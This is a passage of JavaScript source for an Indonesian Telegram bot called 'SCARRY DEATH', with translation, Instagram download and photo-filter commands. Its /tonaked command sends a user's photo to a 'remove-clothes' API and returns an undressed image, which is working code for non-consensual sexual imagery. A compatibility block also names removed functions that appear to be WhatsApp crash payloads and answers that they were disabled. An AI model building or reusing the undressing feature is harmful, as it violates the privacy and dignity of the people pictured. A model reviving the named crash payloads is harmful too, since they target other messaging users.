  run(key, task) {
    const k = String(key).trim();
    if (!k) throw new TypeError('Job key wajib diisi');
    if (this.inFlight.has(k)) return { reused: true, promise: this.inFlight.get(k) };
    const promise = Promise.resolve().then(task).finally(() => {
      if (this.inFlight.get(k) === promise) this.inFlight.delete(k);
    });
    this.inFlight.set(k, promise);
    return { reused: false, promise };
  }
  isRunning(key) { return this.inFlight.has(String(key).trim()); }
}

return { escapeHtml, formatRich, sendRich, makeStatusCard, SingleFlight };

})();
bot.onText(/^\/richpreview(?:@\w+)?$/i, async (msg) => {
  const preview = [
    { h1: '✦ SCARRY DEATH ✦' },
    { h2: 'RICH MESSAGE • 42.0 Pro' },
    { p: ['Tampilan pesan informasional dengan komponen Rich.', 'Status ditampilkan berdasarkan hasil proses, bukan dibuat-buat.'] },
    { hr: true },
    { table: {
        headers: ['KOMPONEN', 'STATUS'],
        rows: [['Rich Table', 'READY'], ['Status Card', 'READY'], ['Single Flight', 'AVAILABLE'], ['Pengiriman', 'TIDAK DILAKUKAN']]
    } },
    { details: { summary: 'INFORMASI', content: 'Demo UI ini tidak mengirim pesan WhatsApp apa pun.', open: true } },
    { checkbox: [{ checked: true, text: 'Tampilan Rich tersedia' }, { checked: true, text: 'Fallback HTML tersedia' }, { checked: false, text: 'Mengirim pesan WhatsApp' }] },
    { footer: 'SCARRY DEATH • RICH UI PREVIEW' }
  ];
  try { await SCARRY_SAFE_UI.sendRich(bot, msg.chat.id, preview); }
  catch (err) { console.warn('[SCARRY RICH PREVIEW]', err?.message || err); }
});
// ===== END SAFE RICH UI =====


// ===== SCARRY DEATH: COMPATIBILITY COMMANDS FOR REMOVED FUNCTIONS =====
// Pendaftaran command tetap dipertahankan. Command yang memanggil fungsi
// dihapus akan diberi pesan aman, bukan dieksekusi/menyebabkan ReferenceError.
const SCARRY_DISABLED_FUNCTIONS = new Set(["bebasspa", "murbugraa", "murbugraa", "murbugra", "raraaimup", "raraai", "raraaimup", "raraaimu", "raraaimupp5v", "raraaimupp6h", "raraaimupp7n", "raraaimupp8b", "raraaimupp9n", "raraaimupp10n", "clientnewsletterFollowbv", "delaychathk", "delayraraa1j", "delayraraa2j", "delayraraa3b", "blankraraa1j", "blankraraa2b", "blankraraa3n", "forceraraa1j", "forceraraa2bk", "iosraraa1n", "iosraraa2hj", "iosraraa3"]);
const SCARRY_REGISTER_ON_TEXT = bot.onText.bind(bot);
bot.onText = function(pattern, callback) {
  if (typeof callback !== 'function') return SCARRY_REGISTER_ON_TEXT(pattern, callback);
  const source = Function.prototype.toString.call(callback);
  const callsRemoved = [...SCARRY_DISABLED_FUNCTIONS].some(name =>
    new RegExp('\\b' + name + '\\s*\\(').test(source)
  );
  if (!callsRemoved) return SCARRY_REGISTER_ON_TEXT(pattern, callback);
  return SCARRY_REGISTER_ON_TEXT(pattern, async (msg) => {
    try {
      await bot.sendMessage(msg.chat.id,
        '<b>SCARRY DEATH</b>\nFungsi payload pada command ini sudah dihapus sesuai permintaan. Command lain tetap aktif.',
        {parse_mode: 'HTML'});
    } catch (err) { console.warn('[SCARRY COMMAND DISABLED]', String(err.message || err).slice(0, 160)); }
  });
};
// ===== END COMPATIBILITY =====

// ===== Helpers: safeEdit / safeDelete =====
async function safeEdit(msgObj, chatId, text) {
  try {
    if (!msgObj) return;
    const messageId = msgObj.message_id ?? msgObj.result?.message_id;
    if (!messageId) return;
    await bot.editMessageText(text, { chat_id: chatId, message_id: messageId });
  } catch (e) { console.warn('safeEdit failed:', e?.message || e); }
}

async function safeDelete(msgObj, chatId) {
  try {
    if (!msgObj) return;
    const messageId = msgObj.message_id ?? msgObj.result?.message_id;
    if (!messageId) return;
    await bot.deleteMessage(chatId, messageId).catch(()=>{});
  } catch (e) { console.warn('safeDelete failed:', e?.message || e); }
}

// ===== State: prompt per-chat =====
bot._tonakedAsk = {}; // map chatId -> message_id

// ===== Command /tonaked (minta foto via reply) =====
bot.onText(/^\/tonaked$/i, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const promptText = "Kirim foto dengan membalas (reply) pesan ini. untuk mengubah foto menjadi tidak berpakaian tembus pandang.";
    const ask = await bot.sendMessage(chatId, promptText);
    // dukung berbagai bentuk response object
    const askId = ask?.message_id ?? ask?.result?.message_id ?? (ask?.data?.message_id);
    if (askId) bot._tonakedAsk[chatId] = askId;
  } catch (err) {
    console.error('/tonaked command error:', err);
  }
});

// ===== Photo listener: jika reply ke prompt, proses =====
bot.on('photo', async (msg) => {
  try {
    if (!msg.reply_to_message) return;
    const chatId = msg.chat.id;
    const storedId = bot._tonakedAsk[chatId];
    if (!storedId || msg.reply_to_message.message_id !== storedId) return;

    const photos = msg.photo;
    if (!Array.isArray(photos) || photos.length === 0) {
      await bot.sendMessage(chatId, 'Tidak menemukan foto. Pastikan kirim sebagai photo (bukan dokumen).');
      delete bot._tonakedAsk[chatId];
      return;
    }
    const fileId = photos[photos.length - 1].file_id;

    const progress = await bot.sendMessage(chatId, 'Mengupload & memproses foto...');

    try {
      let fileUrl;
      try {
        fileUrl = await bot.getFileLink(fileId);
        if (!fileUrl || typeof fileUrl !== 'string') throw new Error('getFileLink returned invalid URL');
      } catch (err) {
        console.error('getFileLink failed:', err);
        await safeEdit(progress, chatId, 'Gagal mengambil file dari Telegram.');
        return;
      }

      // kirim ke API (API yang menerima param imageUrl)
      const API_ENDPOINT = `https://api.nekolabs.web.id/style-changer/remove-clothes?imageUrl=${encodeURIComponent(fileUrl)}`;
      const apiResp = await axios.get(API_ENDPOINT, {
        responseType: 'arraybuffer',
        timeout: 60_000,
        headers: { 'User-Agent': 'TelegramBot/1.0' }
      });

      await handleApiResponse({ chatId, apiResp, processingMsg: progress });
    } catch (err) {
      console.error('photo processing error:', err?.response?.data ?? err?.message ?? err);
      await safeEdit(progress, chatId, "Gagal memproses foto. Coba lagi nanti.");
    } finally {
      delete bot._tonakedAsk[chatId];
    }
  } catch (e) {
    console.error('photo listener top error:', e);
  }
});

// ===== handleApiResponse: JSON/base64/binary =====
async function handleApiResponse({ chatId, apiResp, processingMsg }) {
  try {
    const contentType = (apiResp.headers && apiResp.headers['content-type']) ? apiResp.headers['content-type'] : '';
    const raw = apiResp.data;

    if (/application\/json|text\/json|application\/.+\+json/i.test(contentType)) {
      const text = Buffer.from(raw).toString('utf8');
      let data;
      try { data = JSON.parse(text); } catch (e) {
        console.error('JSON parse error:', e);
        await safeEdit(processingMsg, chatId, "Respon API tidak valid.");
        return;
      }

      const url = (data.result || data.url || data.data || null);
      if (typeof url === 'string' && /^https?:\/\//i.test(url)) {
        await safeDelete(processingMsg, chatId);
        await bot.sendPhoto(chatId, url, { caption: "✅ Selesai — hasil diproses." });
        return;
      }

      if (typeof data.image === 'string' && data.image.startsWith('data:')) {
        const base64 = data.image.split(',')[1];
        const buffer = Buffer.from(base64, 'base64');
        await sendBufferAsPhoto(chatId, buffer, processingMsg);
        return;
      }

      await safeEdit(processingMsg, chatId, "Respon API tidak mengandung hasil.");
      console.warn('Unhandled JSON response:', data);
      return;
    }

    // non-JSON -> binary image expected
    const buffer = Buffer.from(raw);
    if (buffer.length < 100) {
      console.warn('Small binary response from API:', buffer.length);
      await safeEdit(processingMsg, chatId, "Respon API tidak valid atau kosong.");
      return;
    }

    await sendBufferAsPhoto(chatId, buffer, processingMsg);
  } catch (err) {
    console.error('handleApiResponse error:', err);
    await safeEdit(processingMsg, chatId, "Terjadi kesalahan saat menerima hasil dari API.");
  }
}

// ===== sendBufferAsPhoto: simpan sementara & kirim =====
async function sendBufferAsPhoto(chatId, buffer, processingMsg) {
  const tmpName = `tonaked_result_${chatId}_${Date.now()}.jpg`;
  const tmpPath = path.join(__dirname, tmpName);

  try {
    fs.writeFileSync(tmpPath, buffer);

    if (processingMsg) {
      try { await safeDelete(processingMsg, chatId); } catch (_) {}
    }

    const stream = fs.createReadStream(tmpPath);
    await bot.sendPhoto(chatId, stream, { caption: "✅ Selesai — hasil diproses." });
  } catch (e) {
    console.error('sendBufferAsPhoto error:', e);
    try {
      await bot.sendPhoto(chatId, tmpPath, { caption: "✅ Selesai — hasil diproses." });
    } catch (ee) {
      console.error('fallback sendPhoto error:', ee);
      try { await bot.sendMessage(chatId, "Gagal mengirim hasil."); } catch(_) {}
    }
  } finally {
    try { if (fs.existsSync(tmpPath)) fs.unlinkSync(tmpPath); } catch (e) {}
  }
}

// ===== /tonaked_cancel =====
bot.onText(/^\/tonaked_cancel$/i, async (msg) => {
  try {
    const chatId = msg.chat.id;
    if (bot._tonakedAsk[chatId]) {
      delete bot._tonakedAsk[chatId];
      await bot.sendMessage(chatId, 'Proses /tonaked dibatalkan.');
    } else {
      await bot.sendMessage(chatId, 'Tidak ada proses aktif.');
    }
  } catch (e) {
    console.error('/tonaked_cancel error:', e);
  }
});

bot.onText(/^\/ceklink\s+(-?\d+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetGroupId = match[1];

  // CEK AKSES
  if (!isAllowed(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya akses untuk menggunakan perintah ini.");
  }

  try {
    const chatInfo = await bot.getChat(targetGroupId);

    const groupName = chatInfo.title || "Tidak diketahui";

    // ✅ JIKA GRUP PUBLIK (ADA USERNAME)
    if (chatInfo.username) {
      const link = `https://t.me/${chatInfo.username}`;

      return bot.sendMessage(
        chatId,
`🔗 Link Grup Ditemukan

Nama Grup : ${groupName}
ID Grup   : ${targetGroupId}
Tipe      : Publik
Link      : ${link}`
      );
    }

    // ✅ JIKA GRUP PRIVATE → BUTUH ADMIN
    try {
      const invite = await bot.createChatInviteLink(targetGroupId);

      return bot.sendMessage(
        chatId,
`🔗 Link Grup Dibuat

Nama Grup : ${groupName}
ID Grup   : ${targetGroupId}
Tipe      : Private
Link      : ${invite.invite_link}`
      );

    } catch (err) {
      return bot.sendMessage(
        chatId,
`⚠️ Tidak Bisa Mengambil Link

Nama Grup : ${groupName}
ID Grup   : ${targetGroupId}
Alasan    : Bot bukan admin / tidak ada izin`
      );
    }

  } catch (err) {
    return bot.sendMessage(chatId, "❌ ID grup tidak valid atau bot tidak mengenal grup tersebut.");
  }
});

// Simpan status terjemahan per chat (chatId -> true/false)
const translationStatus = {};

// Escape HTML untuk parse_mode 'HTML'
function escapeHtml(text = '') {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// Peta bahasa -> emoji bendera (tambahkan sesuai kebutuhan)
function langToFlag(langCode = '') {
  if (!langCode) return '🌐';
  const code = langCode.toLowerCase();
  const map = {
    en: '🇺🇸',
    id: '🇮🇩',
    ms: '🇲🇾',
    fr: '🇫🇷',
    es: '🇪🇸',
    de: '🇩🇪',
    it: '🇮🇹',
    pt: '🇵🇹',
    ru: '🇷🇺',
    ja: '🇯🇵',
    ko: '🇰🇷',
    zh: '🇨🇳',
    ar: '🇸🇦',
    hi: '🇮🇳',
    th: '🇹🇭',
    vi: '🇻🇳'
  };
  // cek prefix (mis. zh-CN -> zh)
  const prefix = code.split(/[-_]/)[0];
  return map[prefix] || '🌐';
}

// Fungsi translate dengan Google Translate (gratis)
async function translateAuto(text, targetLang) {
  const url = 'https://translate.googleapis.com/translate_a/single';
  const params = {
    client: 'gtx',
    sl: 'auto',
    tl: targetLang,
    dt: 't',
    q: text
  };

  const res = await axios.get(url, { params, timeout: 10000 });
  const data = res.data;

  // safety check
  if (!Array.isArray(data) || !Array.isArray(data[0])) {
    throw new Error('Unexpected translate response');
  }

  const translatedText = data[0].map(p => p[0]).join('');
  const originalText   = data[0].map(p => p[1] || '').join('');
  // detectedLang bisa berada di data[2] atau data[8][0][0] tergantung response; handle both
  let detectedLang = '';
  if (Array.isArray(data[2])) detectedLang = data[2][0] || '';
  if (!detectedLang && Array.isArray(data[8]) && Array.isArray(data[8][0])) {
    detectedLang = data[8][0][0] || '';
  }

  return { translatedText, originalText, detectedLang: (detectedLang || '').toLowerCase() };
}

// Command /terjemahan on/off
bot.onText(/\/terjemahan(?:\s+(\w+))?/i, (msg, match) => {
  const chatId = msg.chat.id;
  const arg = (match && match[1]) ? match[1].toLowerCase() : '';

  if (arg === 'on') {
    translationStatus[chatId] = true;
    const reply =
      `<b>Fitur Terjemahan</b>\n` +
      `<blockquote>✅ Terjemahan <b>AKTIF</b> untuk chat ini. Semua pesan teks akan otomatis diterjemahkan dan dibalas.</blockquote>`;
    return bot.sendMessage(chatId, reply, { parse_mode: 'HTML' });
  }

  if (arg === 'off') {
    translationStatus[chatId] = false;
    const reply =
      `<b>Fitur Terjemahan</b>\n` +
      `<blockquote>❌ Terjemahan <b>DINONAKTIFKAN</b> untuk chat ini.</blockquote>`;
    return bot.sendMessage(chatId, reply, { parse_mode: 'HTML' });
  }

  const isOn = !!translationStatus[chatId];
  const help =
    `<b>Fitur Terjemahan</b>\n` +
    `<blockquote>Status saat ini: <b>${isOn ? 'ON ✅' : 'OFF ❌'}</b>\n\n` +
    `Gunakan:\n` +
    `• <code>/terjemahan on</code>  - Aktifkan\n` +
    `• <code>/terjemahan off</code> - Matikan\n\n` +
    `Catatan: Jika pesan berbahasa Inggris → diterjemahkan ke Bahasa Indonesia.\n` +
    `Jika pesan bukan Inggris → diterjemahkan ke Bahasa Inggris.</blockquote>`;

  bot.sendMessage(chatId, help, { parse_mode: 'HTML' });
});

// Listener semua pesan (terjemahan)
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // ignore non-text
  if (!text) return;

  // jangan proses command terjemahan sendiri
  if (/^\/terjemahan\b/i.test(text)) return;

  // hanya proses jika terjemahan di chat ini aktif
  if (!translationStatus[chatId]) return;

  // ambil mention / nama pengirim
  let mention;
  if (msg.from && msg.from.username) {
    mention = '@' + escapeHtml(msg.from.username);
  } else if (msg.from) {
    const name = `${msg.from.first_name || ''}${msg.from.last_name ? ' ' + msg.from.last_name : ''}`.trim();
    mention = escapeHtml(name || 'user');
  } else {
    mention = 'user';
  }

  try {
    // deteksi bahasa (dengan target English untuk dapat text terjemahan)
    const first = await translateAuto(text, 'en');
    const detected = (first.detectedLang || '').toLowerCase();

    // safety: jika terdeteksi kosong, anggap auto
    const detectedForShow = detected || 'auto';

    let finalTargetLang, translated, flagOriginal, flagTranslated, originalForShow;

    if (detected.startsWith('en')) {
      // asli Inggris → terjemahkan ke Indonesian
      finalTargetLang = 'id';
      const second = await translateAuto(text, 'id');
      translated = second.translatedText;
      flagOriginal = langToFlag('en');
      flagTranslated = langToFlag('id');
      originalForShow = text;
    } else {
      // asli selain Inggris → gunakan hasil pertama (English)
      finalTargetLang = 'en';
      translated = first.translatedText;
      flagOriginal = langToFlag(detectedForShow);
      flagTranslated = langToFlag('en');
      // Use detected original text (if available) else text
      originalForShow = first.originalText || text;
    }

    // Potong teks panjang agar tidak spam (opsional)
    const TRIM_LIMIT = 1200; // karakter
    const safeOriginal = escapeHtml(originalForShow.length > TRIM_LIMIT ? originalForShow.slice(0, TRIM_LIMIT) + '…' : originalForShow);
    const safeTranslated = escapeHtml(translated.length > TRIM_LIMIT ? translated.slice(0, TRIM_LIMIT) + '…' : translated);

    // Susun pesan yang mudah dibaca
    const replyHtml =
      `<b>Terjemahan untuk ${mention}</b>\n` +
      `<blockquote>` +
      `${flagOriginal} <b>Asli (${escapeHtml(detectedForShow)})</b>:\n` +
      `${safeOriginal}\n\n` +
      `${flagTranslated} <b>Terjemahan (${escapeHtml(finalTargetLang)})</b>:\n` +
      `${safeTranslated}` +
      `</blockquote>`;

    await bot.sendMessage(chatId, replyHtml, {
      parse_mode: 'HTML',
      reply_to_message_id: msg.message_id
    });
  } catch (err) {
    console.error('Translate error:', err && err.message ? err.message : err);
    // Jika error, kirim pesan singkat (tanpa detail error)
    try {
      const errMsg = `<b>Terjemahan</b>\n<blockquote>❗ Terjadi kesalahan saat menerjemahkan pesan ini.</blockquote>`;
      await bot.sendMessage(chatId, errMsg, { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
    } catch (_) {}
  }
});

// ========= FITUR /superhd =========
bot.onText(/\/superhd/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🔧 *Kirim foto dengan membalas (reply) pesan ini — akan di-upscale menjadi SUPER HD.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.superhdAsk = ask.message_id;
});

// Saat user mengirim foto untuk /superhd
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /superhd
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.superhdAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Sedang meningkatkan kualitas foto ke SUPER HD...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/superhd?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "superhd_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🔧✨ Foto berhasil di-upscale menjadi *SUPER HD*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto SUPER HD.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.superhdAsk = null;
});
// ========= FITUR /toreal =========
bot.onText(/\/toreal/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🧍 *Kirim foto kamu dengan membalas (reply) pesan ini — akan diubah menjadi gaya Realistik.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.torealAsk = ask.message_id;
});

// Saat user mengirim foto untuk /toreal
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /toreal
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.torealAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto kamu ke gaya Realistik...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/toreal?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "toreal_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🧍✨ Foto berhasil diubah ke *gaya Realistik*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto Toreal.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.torealAsk = null;
});
// ========= FITUR /tomonyet =========
bot.onText(/\/tomonyet/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🐒 *Kirim foto kamu dengan membalas (reply) pesan ini — akan diubah ke gaya Tomonyet.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.tomonyetAsk = ask.message_id;
});

// Saat user mengirim foto untuk /tomonyet
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /tomonyet
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tomonyetAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto kamu ke gaya Tomonyet...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tomonyet?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "tomonyet_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🐒✨ Foto berhasil diubah ke *gaya Tomonyet*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto Tomonyet.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.tomonyetAsk = null;
});

bot.onText(/^\/igdl(?:\s+(.*))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url) {
    return bot.sendMessage(chatId, "❌ Contoh penggunaan:\n/igdl https://www.instagram.com/reel/xxxx");
  }

  bot.sendMessage(chatId, "⏳ Sedang memproses link Instagram...");

  try {
    const apiurl = `https://api-faa.my.id/faa/igdl?url=${encodeURIComponent(url)}`;
    const response = await axios.get(apiurl);
    const data = response.data;

    if (!data.status) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    const result = data.result;
    const links = result.url; // array video/gambar
    const meta = result.metadata;

    // Kirim metadata dulu
    let caption = `✅ *Instagram Downloader*\n`;
    caption += `👤 Username: *${meta.username}*\n`;
    caption += `❤️ Like: *${meta.like}*\n`;
    caption += `💬 Comment: *${meta.comment}*\n`;
    caption += `🎥 Video: *${meta.isVideo ? "Ya" : "Tidak"}*\n\n`;
    caption += `📝 Caption:\n${meta.caption}`;

    await bot.sendMessage(chatId, caption, { parse_mode: "Markdown" });

    // Kirim semua media
    for (let media of links) {
      if (meta.isVideo) {
        await bot.sendVideo(chatId, media);
      } else {
        await bot.sendPhoto(chatId, media);
      }
    }

  } catch (err) {
    console.error("ERROR IGDL:", err.message);
    return bot.sendMessage(chatId, "❌ Terjadi kesalahan mengambil data Instagram.");
  }
});
// ========= FITUR /tobabi =========
bot.onText(/\/tobabi/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🐷 *Kirim foto kamu dengan membalas (reply) pesan ini — akan diubah ke gaya Tobabi.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.tobabiAsk = ask.message_id;
});

// Saat user mengirim foto untuk /tobabi
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /tobabi
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tobabiAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto kamu ke gaya Tobabi...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tobabi?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "tobabi_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🐷✨ Foto berhasil diubah ke *gaya Tobabi*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto Tobabi.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.tobabiAsk = null;
});
// ========= FITUR /todpr =========
bot.onText(/\/todpr/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🏛️ *Kirim foto kamu dengan membalas (reply) pesan ini — akan diubah ke gaya Todpr.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.todprAsk = ask.message_id;
});

// Saat user mengirim foto untuk /todpr
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /todpr
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.todprAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto kamu ke gaya Todpr...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/todpr?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "todpr_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🏛️✨ Foto berhasil diubah ke *gaya Todpr*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto Todpr.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.todprAsk = null;
});
// ========= FITUR /toanime =========
bot.onText(/\/toanime/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🎌 *Kirim foto kamu dengan membalas (reply) pesan ini — akan diubah menjadi gaya Anime.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.toanimeAsk = ask.message_id;
});

// Saat user mengirim foto untuk /toanime
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /toanime
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.toanimeAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto kamu menjadi gaya Anime...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/toanime?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman (kayak /tomekah & /topiramida)
        const tempPath = path.join(__dirname, "toanime_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🎌✨ Foto berhasil diubah menjadi *gaya Anime*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto Anime.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.toanimeAsk = null;
});
// ========= FITUR /topiramida =========
bot.onText(/\/topiramida/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "📸 *Kirim foto dengan membalas (reply) pesan ini — akan diubah menjadi gaya Topiramida.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.topiramidaAsk = ask.message_id;
});

// Saat user mengirim foto untuk /topiramida
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /topiramida
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.topiramidaAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto menjadi gaya Topiramida...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/topiramida?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "topiramida_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "📸✨ Foto berhasil diubah menjadi *gaya Topiramida*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto Topiramida.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.topiramidaAsk = null;
});
// ========= FITUR /topolaroid =========
bot.onText(/\/topolaroid/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "📸 *Kirim foto dengan membalas (reply) pesan ini — akan diubah menjadi gaya Topolaroid.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.topolaroidAsk = ask.message_id;
});

// Saat user mengirim foto (handler umum, sama kayak punyamu yang lain)
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Kalau bukan reply ke pesan /topolaroid, lewatin aja
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.topolaroidAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto menjadi gaya Topolaroid...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/topolaroid?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "topolaroid_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "📸✨ Foto berhasil diubah menjadi *gaya Topolaroid*!",
